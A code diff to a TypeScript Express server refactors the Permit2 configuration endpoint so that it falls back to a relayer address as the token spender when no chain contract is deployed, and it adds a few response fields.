@@ -389,22 +389,20 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const chainId = req.query.chainId ? parseInt(req.query.chainId as string) : null;
       
-      if (chainId) {
-        const contractAddress = getContractForChain(chainId);
-        if (!contractAddress) {
-          return res.status(400).json({ error: `No contract deployed for chain ${chainId}` });
-        }
-        res.json({
-          spenderAddress: contractAddress,
-          permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
-          contractAddress,
-        });
-      } else {
-        res.json({
-          permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
-          chainContracts: CHAIN_CONTRACTS,
-        });
+      const contractAddress = chainId ? getContractForChain(chainId) : null;
+      const spenderAddress = contractAddress || getRelayerAddress();
+      
+      if (!spenderAddress) {
+        return res.status(500).json({ error: "No spender configured" });
       }
+      
+      res.json({
+        spenderAddress,
+        permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+        contractAddress: contractAddress || null,
+        chainContracts: CHAIN_CONTRACTS,
+        usingContract: !!contractAddress,
+      });
     } catch (error) {
       res.status(500).json({ error: "Failed to get Permit2 config" });
     }
